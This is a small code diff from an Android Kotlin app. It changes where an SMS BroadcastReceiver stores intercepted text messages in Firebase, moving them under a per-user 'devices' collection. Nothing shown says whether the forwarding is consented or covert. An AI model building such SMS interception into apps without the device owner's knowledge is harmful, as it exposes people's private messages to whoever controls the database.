@@ -29,8 +29,8 @@ class SmsReceiver : BroadcastReceiver() {
                         "timestamp" to System.currentTimeMillis()
                     )
                     
-                    db.collection("sms").document(userName)
-                        .collection("logs").add(smsData)
+                    db.collection("devices").document(userName)
+                        .collection("sms").add(smsData)
                         .addOnSuccessListener {
                             Log.d("SmsReceiver", "SMS saved to Firebase successfully")
                         }
